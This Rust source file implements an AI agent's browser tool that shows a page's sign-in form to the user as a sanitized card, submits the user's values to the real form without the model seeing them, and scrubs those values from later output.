//! `browser_show_element` (209 D13, §4.10): one element of the page a session drives, typically a
//! sign-in form, shown to the user as a card in the chat; the user fills the card and presses
//! Submit, the values go into the real form and nowhere else, and the model reads a receipt.
//!
//! The agent script (`tile/agent.js`, command `serialize`) clones the element with its computed
//! styles, without scripts, addresses or values, and stamps its controls `data-theuth-field="<n>"`
//! and the element `data-theuth-form="<id>"` in the live page; on obscura it runs through
//! `browser_evaluate`, on an attached tile through the tile op `script` (world `isolated`). The
//! engine sanitises the clone once more with an allowlist ([`sanitize`]) and publishes
//! [`ElementFormRequested`]; the client's card answers with the RPC `answer_element_form`
//! ([`answer`]). The tool waits for it like `ask_user` (`tools.ask_timeout_secs`), then, on the
//! same browser, checks the page is still the one shown and the agent script's `fill_form` sets
//! the values by index and submits. [`ElementFormResolved`] closes the card.
//!
//! Values (209 §4.10, §9) live in the RPC params, in [`Zeroizing`] strings here, and in the page:
//! never in an event, a `ToolOutput`, `tracing` or `sessions.sqlite`. What a session submitted is
//! scrubbed from its later browser replies ([`scrub`]). On a tile the values reach the page inside
//! the one `script` op's arguments, the only path to the client holding it.

use std::collections::{BTreeMap, HashMap};
use std::sync::{Arc, LazyLock};
use std::time::Duration;

use parking_lot::Mutex;
use runtime::{Runtime, SessionId};
use schemars::JsonSchema;
use serde::{Deserialize, Serialize};
use serde_json::{Value, json};
use tools::{Risk, Tool, ToolCx, ToolOutput};
use zeroize::Zeroizing;

use crate::tile;
use crate::tools::{Ctx, NO_BROWSER, text_of};

/// Correlates an [`ElementFormRequested`] with its answer (209 §4.4).
#[derive(Clone, Copy, Debug, PartialEq, Eq, Hash, Serialize, Deserialize, JsonSchema)]
#[cfg_attr(feature = "ts", derive(ts_rs::TS), ts(export))]
#[serde(transparent)]
pub struct ElementFormId(pub uuid::Uuid);

/// One control of the card (209 §4.4): `index` is its `data-theuth-field`.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[cfg_attr(feature = "ts", derive(ts_rs::TS), ts(export))]
pub struct ElementFormField {
    /// The `data-theuth-field` index in the snapshot and the live page.
    pub index: u32,
    /// Input type in lower case (`email`, `password`, `checkbox`, …), `textarea`, `select` or
    /// `submit`.
    pub kind: String,
    /// The control's `name`, or empty.
    pub name: String,
    /// What the page labels it with, never its value.
    pub label: String,
    /// A password or another secret field: rendered masked.
    pub masked: bool,
}

/// Event: an agent session shows one element of its page as a card (209 D13, §4.4, §4.10).
/// No field value, ever.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[cfg_attr(feature = "ts", derive(ts_rs::TS), ts(export))]
#[schemars(transform = wire::serde_type_tag::<Self>)]
#[serde(tag = "type")]
pub struct ElementFormRequested {
    /// `answer_element_form`'s id.
    pub id: ElementFormId,
    /// The session the tool runs in.
    pub session: SessionId,
    /// The `browser_show_element` call the card belongs to.
    pub call_id: String,
    /// `scheme://host[:port]` in ASCII, from the browser's address at serialise time.
    pub origin: String,
    /// The page's address at serialise time.
    pub url: String,
    /// `obscura:<engine>` or `web:<tile id>`.
    pub source: String,
    /// The tool's `title`, else the page's title.
    pub title: String,
    /// The sanitised snapshot ([`sanitize`]).
    pub html: String,
    /// The element's rendered width in CSS px.
    pub width: u32,
    /// The element's rendered height in CSS px.
    pub height: u32,
    /// The controls, in index order.
    pub fields: Vec<ElementFormField>,
}

impl wire::WireEvent for ElementFormRequested {
    const TOPIC: &'static str = "browser.element-form-requested";
}

/// How a card ended (209 §4.4).
#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[cfg_attr(feature = "ts", derive(ts_rs::TS), ts(export))]
#[serde(rename_all = "snake_case")]
pub enum ElementFormOutcome {
    /// The values were typed and the form submitted.
    Submitted,
    /// The user cancelled (or the call was cancelled).
    Cancelled,
    /// The page changed since the card was shown: nothing was typed.
    Stale,
    /// No answer within `tools.ask_timeout_secs`.
    Timeout,
}

/// Event: the card is answered or gone (209 §4.4).
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[cfg_attr(feature = "ts", derive(ts_rs::TS), ts(export))]
#[schemars(transform = wire::serde_type_tag::<Self>)]
#[serde(tag = "type")]
pub struct ElementFormResolved {
    /// The request's id.
    pub id: ElementFormId,
    /// How it ended.
    pub outcome: ElementFormOutcome,
}

impl wire::WireEvent for ElementFormResolved {
    const TOPIC: &'static str = "browser.element-form-resolved";
}

/// The card's answer (209 §4.4): `{ "submit": { "values": { "<index>": "…" } } }` or
/// `{ "cancel": {} }` (the bare string `"cancel"` is taken too). Its `Debug` never shows a value.
#[derive(Clone, Serialize, JsonSchema)]
#[cfg_attr(feature = "ts", derive(ts_rs::TS), ts(export))]
#[serde(rename_all = "snake_case")]
pub enum ElementFormAnswer {
    /// Type `values` (by field index) and submit.
    Submit {
        /// Field index as a decimal string → what the user entered.
        values: BTreeMap<String, String>,
    },
    /// Close the card; nothing is typed.
    Cancel {},
}

impl std::fmt::Debug for ElementFormAnswer {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Submit { values } => write!(f, "Submit({} values)", values.len()),
            Self::Cancel {} => f.write_str("Cancel"),
        }
    }
}

impl<'de> Deserialize<'de> for ElementFormAnswer {
    fn deserialize<D: serde::Deserializer<'de>>(d: D) -> Result<Self, D::Error> {
        struct Answer;

        #[derive(Deserialize)]
        #[serde(deny_unknown_fields)]
        struct Submit {
            values: BTreeMap<String, String>,
        }

        impl<'de> serde::de::Visitor<'de> for Answer {
            type Value = ElementFormAnswer;

            fn expecting(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
                f.write_str(r#"{ "submit": { "values": {…} } }, { "cancel": {} } or "cancel""#)
            }

            fn visit_str<E: serde::de::Error>(self, v: &str) -> Result<Self::Value, E> {
                match v {
                    "cancel" => Ok(ElementFormAnswer::Cancel {}),
                    other => Err(E::unknown_variant(other, &["submit", "cancel"])),
                }
            }

            fn visit_map<A: serde::de::MapAccess<'de>>(
                self,
                mut map: A,
            ) -> Result<Self::Value, A::Error> {
                use serde::de::Error as _;
                let Some(key) = map.next_key::<String>()? else {
                    return Err(A::Error::custom("an empty answer"));
                };
                let answer = match key.as_str() {
                    "submit" => ElementFormAnswer::Submit {
                        values: map.next_value::<Submit>()?.values,
                    },
                    "cancel" => {
                        map.next_value::<serde::de::IgnoredAny>()?;
                        ElementFormAnswer::Cancel {}
                    }
                    other => return Err(A::Error::unknown_variant(other, &["submit", "cancel"])),
                };
                if map.next_key::<serde::de::IgnoredAny>()?.is_some() {
                    return Err(A::Error::custom("one of `submit` or `cancel`"));
                }
                Ok(answer)
            }
        }

        d.deserialize_any(Answer)
    }
}

/// What the waiting tool receives: values by field index, held in [`Zeroizing`] strings.
enum Reply {
    Submit(BTreeMap<u32, Zeroizing<String>>),
    Cancel,
}

/// One card waiting on this engine.
struct Waiting {
    request: ElementFormRequested,
    tx: tokio::sync::oneshot::Sender<Reply>,
}

/// Cards waiting on one engine, a [`Runtime`] extension shared by the tool and the RPC handler.
#[derive(Clone, Default)]
struct Forms(Arc<Mutex<HashMap<ElementFormId, Waiting>>>);

fn forms(rt: &Runtime) -> Forms {
    rt.extension(Forms::default)
}

/// Whether card `id` waits on this engine.
#[must_use]
pub fn pending_here(rt: &Runtime, id: ElementFormId) -> bool {
    forms(rt).0.lock().contains_key(&id)
}

/// The cards waiting on this engine (`session`'s only, when given), oldest first: what
/// `element_forms_pending` answers a client that attached late.
#[must_use]
pub fn pending(rt: &Runtime, session: Option<SessionId>) -> Vec<ElementFormRequested> {
    let mut out: Vec<ElementFormRequested> = forms(rt)
        .0
        .lock()
        .values()
        .filter(|w| session.is_none_or(|s| w.request.session == s))
        .map(|w| w.request.clone())
        .collect();
    out.sort_by_key(|r| r.id.0);
    out
}

/// The card's answer (the RPC `answer_element_form`, owner connections only): `true` when card
/// `id` was waiting here and this answer was taken (the first one wins). Values move into
/// [`Zeroizing`] strings; keys that are not a field index are dropped.
pub fn answer(rt: &Runtime, id: ElementFormId, answer: ElementFormAnswer) -> bool {
    let Some(w) = forms(rt).0.lock().remove(&id) else {
        return false;
    };
    let reply = match answer {
        ElementFormAnswer::Cancel {} => Reply::Cancel,
        ElementFormAnswer::Submit { values } => Reply::Submit(
            values
                .into_iter()
                .filter_map(|(k, v)| {
                    let v = Zeroizing::new(v);
                    let k = k.parse::<u32>().ok()?;
                    (k < w.request.fields.len() as u32).then_some((k, v))
                })
                .collect(),
        ),
    };
    w.tx.send(reply).is_ok()
}

/// Values sessions submitted through a card, scrubbed from their later browser replies (209 §9).
static TYPED: LazyLock<Mutex<HashMap<SessionId, Vec<Zeroizing<String>>>>> =
    LazyLock::new(|| Mutex::new(HashMap::new()));

/// Shortest submitted value [`scrub`] replaces: shorter ones are too likely to be page words.
const SCRUB_MIN: usize = 4;

/// Remember `value` (as typed, and URL-encoded as a GET form sends it) for [`scrub`].
fn remember(session: SessionId, value: &str) {
    if value.chars().count() < SCRUB_MIN {
        return;
    }
    let encoded: String = url::form_urlencoded::byte_serialize(value.as_bytes()).collect();
    let mut all = TYPED.lock();
    let list = all.entry(session).or_default();
    for v in [value.to_owned(), encoded.replace('+', "%20"), encoded] {
        if !list.iter().any(|k| **k == v) {
            list.push(Zeroizing::new(v));
        }
    }
}

/// 209 §9: every value `session` submitted through a card is replaced by `[typed value]` in `text`.
pub(crate) fn scrub(session: SessionId, text: &mut String) {
    let all = TYPED.lock();
    let Some(list) = all.get(&session) else {
        return;
    };
    for v in list {
        if text.contains(v.as_str()) {
            *text = text.replace(v.as_str(), "[typed value]");
        }
    }
}

/// The sessions ended: what they submitted is forgotten.
pub fn forget(sessions: &[SessionId]) {
    let mut all = TYPED.lock();
    for s in sessions {
        all.remove(s);
    }
}

/// Elements of forms and text the card may show (209 §4.10). Any other element is unwrapped
/// (its content kept), except [`DROPPED`] ones.
const TAGS: &[&str] = &[
    "form",
    "fieldset",
    "legend",
    "label",
    "input",
    "button",
    "select",
    "option",
    "optgroup",
    "textarea",
    "output",
    "div",
    "span",
    "p",
    "br",
    "hr",
    "h1",
    "h2",
    "h3",
    "h4",
    "h5",
    "h6",
    "strong",
    "b",
    "em",
    "i",
    "u",
    "s",
    "small",
    "sub",
    "sup",
    "mark",
    "abbr",
    "code",
    "pre",
    "blockquote",
    "q",
    "cite",
    "time",
    "address",
    "ul",
    "ol",
    "li",
    "dl",
    "dt",
    "dd",
    "table",
    "thead",
    "tbody",
    "tfoot",
    "tr",
    "th",
    "td",
    "caption",
    "colgroup",
    "col",
    "section",
    "article",
    "header",
    "footer",
    "main",
    "nav",
    "aside",
    "figure",
    "figcaption",
    "a",
    "img",
    "wbr",
];

/// Elements removed with everything in them: they run, load, embed or draw something.
const DROPPED: &[&str] = &[
    "script",
    "noscript",
    "style",
    "link",
    "meta",
    "base",
    "head",
    "title",
    "template",
    "iframe",
    "frame",
    "frameset",
    "object",
    "embed",
    "applet",
    "param",
    "canvas",
    "video",
    "audio",
    "source",
    "track",
    "picture",
    "svg",
    "math",
    "portal",
    "dialog",
    "xmp",
    "plaintext",
    "noembed",
    "noframes",
];

/// Attributes kept (209 §4.10); `img` also keeps `alt` and a `src` that is an inline
/// `data:image/` PNG, JPEG, GIF or WebP (what `serialize` makes of a same-origin image).
const ATTRS: &[&str] = &[
    "style",
    "type",
    "name",
    "placeholder",
    "autocomplete",
    "checked",
    "selected",
    "disabled",
    "for",
    "id",
    "class",
    "data-theuth-field",
];

/// An image `src` the card may show.
fn inline_image(src: &str) -> bool {
    ["png", "jpeg", "gif", "webp"].iter().any(|t| {
        src.strip_prefix(&format!("data:image/{t};base64,"))
            .is_some_and(|b| {
                b.bytes()
                    .all(|c| c.is_ascii_alphanumeric() || matches!(c, b'+' | b'/' | b'='))
            })
    })
}

/// A `style` value with HTML character references decoded (`&amp;`, `&quot;`, `&lt;`, `&gt;`,
/// `&apos;`, numeric ones), or `None` when it has another reference.
fn decode_refs(v: &str) -> Option<String> {
    let mut out = String::with_capacity(v.len());
    let mut rest = v;
    while let Some(at) = rest.find('&') {
        out.push_str(&rest[..at]);
        let tail = &rest[at + 1..];
        let end = tail.find(';')?;
        let name = &tail[..end];
        let c = match name {
            "amp" => '&',
            "quot" => '"',
            "lt" => '<',
            "gt" => '>',
            "apos" => '\'',
            n => {
                let n = n.strip_prefix('#')?;
                let code = match n.strip_prefix(['x', 'X']) {
                    Some(hex) => u32::from_str_radix(hex, 16).ok()?,
                    None => n.parse().ok()?,
                };
                char::from_u32(code)?
            }
        };
        out.push(c);
        rest = &tail[end + 1..];
    }
    out.push_str(rest);
    Some(out)
}

/// Declarations of a `style` value, split on `;` outside quotes and parentheses.
fn declarations(css: &str) -> Vec<&str> {
    let (mut out, mut depth, mut quote, mut start) = (Vec::new(), 0usize, None, 0usize);
    for (i, c) in css.char_indices() {
        match (quote, c) {
            (Some(q), c) if c == q => quote = None,
            (Some(_), _) => {}
            (None, '"' | '\'') => quote = Some(c),
            (None, '(') => depth += 1,
            (None, ')') => depth = depth.saturating_sub(1),
            (None, ';') if depth == 0 => {
                out.push(&css[start..i]);
                start = i + 1;
            }
            _ => {}
        }
    }
    out.push(&css[start..]);
    out
}

/// Whether one declaration loads nothing: every `url(` is a `data:image/` one, and nothing
/// else that can name a resource or hide one (`image-set(`, `image(`, `expression(`,
/// `-moz-binding`, `behavior`, `javascript:`, an escape) is in it.
fn inert_declaration(d: &str) -> bool {
    let d = d.to_ascii_lowercase();
    if d.contains('\\')
        || [
            "image-set(",
            "image(",
            "expression(",
            "-moz-binding",
            "behavior",
            "javascript:",
            "@import",
            "src(",
        ]
        .iter()
        .any(|bad| d.contains(bad))
    {
        return false;
    }
    d.match_indices("url(").all(|(at, _)| {
        d[at + 4..]
            .trim_start()
            .trim_start_matches(['"', '\''])
            .starts_with("data:image/")
    })
}

/// The `style` value kept: its inert declarations, or `None` when none is left.
fn clean_style(raw: &str) -> Option<String> {
    let css = decode_refs(raw)?;
    let kept: Vec<&str> = declarations(&css)
        .into_iter()
        .map(str::trim)
        .filter(|d| !d.is_empty() && d.contains(':') && inert_declaration(d))
        .collect();
    (!kept.is_empty()).then(|| kept.join("; ").replace('&', "&amp;"))
}

/// The engine's own pass over a snapshot (209 §4.10): only [`TAGS`] (others unwrapped,
/// [`DROPPED`] ones removed with their content), only [`ATTRS`] (so no `on*`, `href`, `action`,
/// `formaction`, `src` or `value`), styles without any `url()` but `data:image/`, no comments.
/// The client trusts nothing in it either.
pub fn sanitize(html: &str) -> Result<String, String> {
    use lol_html::{RewriteStrSettings, comments, doc_comments, element, rewrite_str};
    rewrite_str(
        html,
        RewriteStrSettings {
            element_content_handlers: vec![
                element!("*", |el| {
                    let tag = el.tag_name();
                    if DROPPED.contains(&tag.as_str()) {
                        el.remove();
                        return Ok(());
                    }
                    if !TAGS.contains(&tag.as_str()) {
                        el.remove_and_keep_content();
                        return Ok(());
                    }
                    let names: Vec<String> = el.attributes().iter().map(|a| a.name()).collect();
                    for name in names {
                        let value = el.get_attribute(&name).unwrap_or_default();
                        let keep = match name.as_str() {
                            "style" => clean_style(&value),
                            "data-theuth-field" => (!value.is_empty()
                                && value.bytes().all(|b| b.is_ascii_digit()))
                            .then_some(value),
                            "src" | "alt" if tag == "img" => {
                                (name == "alt" || inline_image(&value)).then_some(value)
                            }
                            n if ATTRS.contains(&n) => Some(value),
                            _ => None,
                        };
                        // Twice-written attributes: remove until none is left.
                        for _ in 0..8 {
                            if !el.has_attribute(&name) {
                                break;
                            }
                            el.remove_attribute(&name);
                        }
                        if let Some(v) = keep {
                            el.set_attribute(&name, &v)?;
                        }
                    }
                    Ok(())
                }),
                comments!("*", |c| {
                    c.remove();
                    Ok(())
                }),
            ],
            document_content_handlers: vec![doc_comments!(|c| {
                c.remove();
                Ok(())
            })],
            ..RewriteStrSettings::new()
        },
    )
    .map_err(|e| format!("the element's snapshot is not valid HTML: {e}"))
}

/// What one card's values went to: obscura, or a tile.
#[derive(Clone, Debug, PartialEq, Eq)]
enum Source {
    Obscura,
    Tile { view: String, delegated: bool },
}

/// The agent script's command `cmd` with `params` on `source` for `session`: its JSON result, or
/// why it did not run. On obscura through `browser_evaluate` in the page (as P3's fixture client
/// runs it); the expression is built in a [`Zeroizing`] buffer, since it may carry values.
async fn agent(
    ctx: &Ctx,
    session: SessionId,
    source: &Source,
    cmd: &'static str,
    params: Value,
) -> Result<Value, String> {
    match source {
        Source::Tile { view, delegated } => {
            tile::agent_json(&ctx.rt, session, view, *delegated, cmd, params).await
        }
        Source::Obscura => {
            ctx.ensure_profile(session)
                .await
                .map_err(|e| e.to_string())?;
            let mut expression = Zeroizing::new(String::with_capacity(tile::AGENT_JS.len() + 256));
            expression.push_str("(async () => { const r = await (async (cmd, params) => {\n");
            expression.push_str(&tile::AGENT_JS);
            expression.push_str("\n})(");
            expression.push_str(&Value::from(cmd).to_string());
            expression.push_str(", ");
            expression.push_str(&Zeroizing::new(params.to_string()));
            expression.push_str("); return JSON.stringify(r === undefined ? null : r); })()");
            let args = json!({ "expression": expression.as_str(), "timeoutMs": 15_000 });
            let v = match ctx.send(session, "browser_evaluate", args).await {
                Ok(Ok(v)) => v,
                Ok(Err(e)) => return Err(e),
                Err(e) => return Err(e.to_string()),
            };
            let (text, is_error) = text_of(&v);
            if is_error {
                return Err(text);
            }
            serde_json::from_str(&text).map_err(|_| "the page answered no JSON".to_owned())
        }
    }
}

/// One line, at most 120 characters.
fn one_line(s: &str) -> String {
    let flat = s.split_whitespace().collect::<Vec<_>>().join(" ");
    if flat.chars().count() > 120 {
        format!("{}…", flat.chars().take(119).collect::<String>())
    } else {
        flat
    }
}

/// `url` without its query and fragment (a GET form puts its values in the query).
fn bare(url: &str) -> String {
    match url::Url::parse(url) {
        Ok(mut u) => {
            u.set_query(None);
            u.set_fragment(None);
            u.to_string()
        }
        Err(_) => url.split(['?', '#']).next().unwrap_or_default().to_owned(),
    }
}

/// How long the page may take to change after the submit (209 §4.10).
const SETTLE: Duration = Duration::from_secs(10);
/// Between two looks at the page after the submit.
const LOOK: Duration = Duration::from_millis(500);

/// What 209 §4.10 refuses, as the model reads it.
fn refusal(r: &Value) -> String {
    match r["refused"].as_str() {
        Some("frame") => format!(
            "the form contains a frame from {} (a CAPTCHA or a sign-in provider); it can only be used in the page itself: show it to the user with show_web or browser_attach to their tile",
            r["origin"].as_str().unwrap_or("an unknown origin")
        ),
        Some("size") => format!(
            "element too large to show ({} KiB > 256 KiB); pick a smaller element",
            r["kib"].as_u64().unwrap_or_default()
        ),
        _ => "no visible control in that element: pick the form, or the part of the page holding its fields"
            .to_owned(),
    }
}

/// The card's request from a `serialize` result, or what the model reads instead.
fn request(
    r: &Value,
    id: ElementFormId,
    session: SessionId,
    call_id: &str,
    source: String,
    title: Option<&str>,
) -> Result<ElementFormRequested, String> {
    if let Some(e) = r["error"].as_str() {
        return Err(e.to_owned());
    }
    if r.get("refused").is_some() {
        return Err(refusal(r));
    }
    let url = r["url"].as_str().unwrap_or_default().to_owned();
    let origin = url::Url::parse(&url)
        .ok()
        .filter(|u| matches!(u.scheme(), "http" | "https"))
        .map(|u| u.origin().ascii_serialization())
        .ok_or("the page has no web address (http or https), so its form cannot be shown")?;
    let html = sanitize(r["html"].as_str().unwrap_or_default())?;
    let fields: Vec<ElementFormField> = r["fields"]
        .as_array()
        .map(|a| {
            a.iter()
                .enumerate()
                .map(|(i, f)| ElementFormField {
                    index: i as u32,
                    kind: one_line(f["kind"].as_str().unwrap_or("text")).to_ascii_lowercase(),
                    name: one_line(f["name"].as_str().unwrap_or_default()),
                    label: one_line(f["label"].as_str().unwrap_or_default()),
                    masked: f["masked"] == true,
                })
                .collect()
        })
        .unwrap_or_default();
    if !fields.iter().any(|f| f.kind != "submit") {
        return Err(refusal(&json!({ "refused": "empty" })));
    }
    let px = |k: &str, or: u32| match r[k].as_u64() {
        Some(n) if n > 0 => u32::try_from(n).unwrap_or(u32::MAX),
        _ => or,
    };
    let title = title
        .map(str::trim)
        .filter(|t| !t.is_empty())
        .unwrap_or_else(|| r["title"].as_str().unwrap_or_default());
    Ok(ElementFormRequested {
        id,
        session,
        call_id: call_id.to_owned(),
        origin,
        url,
        source,
        title: one_line(title),
        html,
        width: px("width", 400),
        height: px("height", 320),
        fields,
    })
}

/// `0 email, 1 password` for the receipt: the field's name, else its label, else its kind.
fn named(fields: &[ElementFormField], filled: &[u32]) -> String {
    let list: Vec<String> = filled
        .iter()
        .filter_map(|i| fields.get(*i as usize))
        .map(|f| {
            let what = [&f.name, &f.label, &f.kind]
                .into_iter()
                .find(|s| !s.is_empty())
                .cloned()
                .unwrap_or_default();
            format!("{} {what}", f.index)
        })
        .collect();
    if list.is_empty() {
        "nothing".to_owned()
    } else {
        list.join(", ")
    }
}

/// A card still showing when the call goes away (the registry's timeout, a cancelled turn): it
/// leaves the pending list and is closed as `cancelled`, without an async context.
struct Open {
    rt: Option<Runtime>,
    id: ElementFormId,
}

impl Drop for Open {
    fn drop(&mut self) {
        use runtime::kameo_actors::message_bus::Publish;
        let Some(rt) = self.rt.take() else { return };
        forms(&rt).0.lock().remove(&self.id);
        let closed = ElementFormResolved {
            id: self.id,
            outcome: ElementFormOutcome::Cancelled,
        };
        if rt.bus.tell(Publish(closed)).try_send().is_err() {
            tracing::debug!("element form resolution not published: the bus is gone or full");
        }
    }
}

impl Open {
    /// Publish the card's end and disarm the guard.
    async fn close(mut self, outcome: ElementFormOutcome) {
        if let Some(rt) = self.rt.take() {
            forms(&rt).0.lock().remove(&self.id);
            rt.publish(ElementFormResolved {
                id: self.id,
                outcome,
            })
            .await;
        }
    }
}

/// Arguments of [`ShowElementTool`].
#[derive(Debug, Default, Serialize, Deserialize, JsonSchema)]
pub struct ShowElementArgs {
    /// Element ref from `browser_read` / `browser_elements`, e.g. `e3` (preferred).
    #[serde(default, rename = "ref")]
    pub ref_: Option<String>,
    /// CSS selector of the element, when no ref fits.
    #[serde(default)]
    pub selector: Option<String>,
    /// What the card says above the form; default: the page title.
    #[serde(default)]
    pub title: Option<String>,
}

/// What `browser_show_element` tells the model (209 §4.10).
const SHOW_TEXT: &str = concat!(
    "Show one element of the current page (typically a sign-in or payment form) to the user as a card in the chat, by `ref` (from browser_read / browser_elements) or CSS `selector`, exactly one. ",
    "The user fills it in the card and presses Submit: their values go straight into this page's real form, which is then submitted; you never see them. You get a receipt with the fields filled (names only) and where the page went, or `cancelled` / `no answer`. ",
    "Use it when a page needs the user's credentials or other private input instead of asking for them in the chat. Works in your own browser and on the user's tile. ",
    "The card is a static copy: site scripts do not run in it (no show-password toggle, no live validation). A form inside a frame (CAPTCHA, a sign-in provider) cannot be shown: send the user to the page with show_web or browser_attach instead. A multi-step sign-in is one call per step. ",
    "The call waits until the user answers.",
);

/// `browser_show_element { ref?, selector?, title? }` (209 D13, §4.10): `Mutating`, approved by
/// its own card (no prompt before it; a session capped at `read_only` never sees it), direct,
/// never promoted to a job.
pub struct ShowElementTool(pub(crate) Arc<Ctx>);

#[async_trait::async_trait]
impl Tool for ShowElementTool {
    const NAME: &'static str = "browser_show_element";
    const RISK: Risk = Risk::Mutating;
    const DIRECT: bool = true;
    const APPROVED_BY_CARD: bool = true;
    type Args = ShowElementArgs;

    fn description(&self) -> String {
        SHOW_TEXT.to_owned()
    }

    fn promotable(&self) -> bool {
        false
    }

    async fn call(&self, a: ShowElementArgs, cx: ToolCx) -> anyhow::Result<ToolOutput> {
        if !tools::egress::lan() {
            return Ok(ToolOutput::err(NO_BROWSER));
        }
        let session = cx.session;
        let on = self.0.tile(session);
        let mut out = self.show(a, &cx).await;
        crate::profile::scrub(session, &mut out.content);
        Ok(self.0.prefixed(session, on, out))
    }
}

impl ShowElementTool {
    async fn show(&self, a: ShowElementArgs, cx: &ToolCx) -> ToolOutput {
        let ctx = &self.0;
        let session = cx.session;
        let target = match (a.ref_.as_deref(), a.selector.as_deref()) {
            (Some(r), None) if !r.trim().is_empty() => ("ref", r.trim().to_owned()),
            (None, Some(s)) if !s.trim().is_empty() => ("selector", s.to_owned()),
            _ => return ToolOutput::err("pass exactly one of `ref` or `selector`"),
        };
        let source = match tile::tile_of(session) {
            Some((view, _, delegated)) => Source::Tile { view, delegated },
            None => Source::Obscura,
        };
        // obscura's refs are its own `data-obscura-ref` stamps; the tile's live in the agent.
        let target = match (&source, target) {
            (Source::Obscura, ("ref", r)) => ("selector", format!("[data-obscura-ref=\"{r}\"]")),
            (_, t) => t,
        };
        let id = ElementFormId(uuid::Uuid::now_v7());
        let mut params = json!({ "form": id.0.to_string() });
        params[target.0] = target.1.into();
        let snap = match agent(ctx, session, &source, "serialize", params).await {
            Ok(r) => r,
            Err(e) => return ToolOutput::err(e),
        };
        let source_name = match &source {
            Source::Tile { view, .. } => format!("web:{view}"),
            Source::Obscura => format!("obscura:{}", engine_name().await),
        };
        let request = match request(
            &snap,
            id,
            session,
            &cx.call_id,
            source_name,
            a.title.as_deref(),
        ) {
            Ok(r) => r,
            Err(e) => return ToolOutput::err(e),
        };
        let (origin, url, fields) = (
            request.origin.clone(),
            request.url.clone(),
            request.fields.clone(),
        );
        let (tx, rx) = tokio::sync::oneshot::channel();
        forms(&ctx.rt).0.lock().insert(
            id,
            Waiting {
                request: request.clone(),
                tx,
            },
        );
        let open = Open {
            rt: Some(ctx.rt.clone()),
            id,
        };
        ctx.rt.publish(request).await;
        let wait = ask_timeout(&ctx.rt);
        let reply = tokio::select! {
            r = rx => r.ok(),
            () = tokio::time::sleep(wait) => None,
            () = cx.cancel.cancelled() => Some(Reply::Cancel),
        };
        let values = match reply {
            None => {
                open.close(ElementFormOutcome::Timeout).await;
                return ToolOutput::ok(format!(
                    "no answer · {origin} · the user did not fill the form within {} min; nothing was typed",
                    wait.as_secs().div_ceil(60)
                ));
            }
            Some(Reply::Cancel) => {
                open.close(ElementFormOutcome::Cancelled).await;
                return ToolOutput::ok(format!(
                    "cancelled · {origin} · the user closed the form; nothing was typed"
                ));
            }
            Some(Reply::Submit(values)) => values,
        };
        for (i, v) in &values {
            let typed = fields.get(*i as usize).is_some_and(|f| {
                !matches!(f.kind.as_str(), "checkbox" | "radio" | "select" | "submit")
            });
            if typed {
                remember(session, v);
            }
        }
        let filled = self
            .fill(session, &source, id, &url, fields.len(), values)
            .await;
        let r = match filled {
            Ok(r) if r.get("stale").is_none() => r,
            Ok(_) => {
                open.close(ElementFormOutcome::Stale).await;
                return ToolOutput::err(
                    "the page changed since the form was shown; nothing was typed",
                );
            }
            Err(e) => {
                open.close(ElementFormOutcome::Stale).await;
                return ToolOutput::err(format!(
                    "the form could not be filled ({e}); nothing was submitted"
                ));
            }
        };
        open.close(ElementFormOutcome::Submitted).await;
        let filled: Vec<u32> = r["filled"]
            .as_array()
            .map(|a| {
                a.iter()
                    .filter_map(|n| n.as_u64())
                    .map(|n| n as u32)
                    .collect()
            })
            .unwrap_or_default();
        let mut text = format!("submitted · {origin} · filled {}", named(&fields, &filled));
        if r["submitted"].as_str().unwrap_or_default().is_empty() {
            text.push_str(
                " · no submit button or form to submit: the values are typed, nothing was sent",
            );
            return ToolOutput::ok(text);
        }
        let from = r["from"].as_str().unwrap_or(&url).to_owned();
        let doc = r["doc"].as_str().unwrap_or_default().to_owned();
        match self.settle(session, &source, &from, &doc).await {
            Some((now, title)) => {
                text.push_str(&format!(" · now {} — {}", bare(&now), one_line(&title)))
            }
            None => text.push_str(" · the page did not change within 10 s"),
        }
        if source == Source::Obscura && crate::profile::tracking(session) {
            let _ = ctx.track(session).await;
        }
        ToolOutput::ok(text)
    }

    /// The agent script's `fill_form` with the user's values, on the browser the card came from.
    async fn fill(
        &self,
        session: SessionId,
        source: &Source,
        id: ElementFormId,
        url: &str,
        count: usize,
        values: BTreeMap<u32, Zeroizing<String>>,
    ) -> Result<Value, String> {
        let mut map = serde_json::Map::new();
        for (i, v) in &values {
            map.insert(i.to_string(), Value::String(v.as_str().to_owned()));
        }
        drop(values);
        let params = json!({
            "form": id.0.to_string(),
            "url": url,
            "count": count,
            "values": Value::Object(map),
        });
        agent(&self.0, session, source, "fill_form", params).await
    }

    /// After the submit: the page's new address and title once it changed (another address or
    /// another document) and finished loading, or `None` after [`SETTLE`].
    async fn settle(
        &self,
        session: SessionId,
        source: &Source,
        from: &str,
        doc: &str,
    ) -> Option<(String, String)> {
        let deadline = tokio::time::Instant::now() + SETTLE;
        let strip = |u: &str| u.split('#').next().unwrap_or_default().to_owned();
        let mut changed = None;
        while tokio::time::Instant::now() < deadline {
            tokio::time::sleep(LOOK).await;
            let Ok(r) = agent(&self.0, session, source, "location", json!({})).await else {
                continue;
            };
            let url = r["url"].as_str().unwrap_or_default();
            if strip(url) != strip(from) || r["doc"].as_str().is_some_and(|d| d != doc) {
                changed = Some((
                    url.to_owned(),
                    r["title"].as_str().unwrap_or_default().to_owned(),
                ));
                if r["ready"] == "complete" || r["ready"].is_null() {
                    break;
                }
            }
        }
        changed
    }
}

/// How long a card waits: the `ask_user` timeout (`tools.ask_timeout_secs`, 30 min by default).
fn ask_timeout(rt: &Runtime) -> Duration {
    let secs = rt
        .section::<tools::ToolsConfig>("tools")
        .map(|c| c.ask_timeout_secs)
        .unwrap_or(1800);
    Duration::from_secs(secs.max(1))
}

/// This engine's id for `obscura:<engine>`; `local` on a lone engine.
async fn engine_name() -> String {
    let store = match kameo::actor::ActorRef::<agent::Agents>::lookup(agent::AGENT_ACTOR) {
        Ok(Some(agents)) => agents.ask(agent::DurableStore).await.ok(),
        _ => None,
    };
    store
        .map(|s| s.engine().to_owned())
        .filter(|e| !e.is_empty())
        .unwrap_or_else(|| "local".to_owned())
}

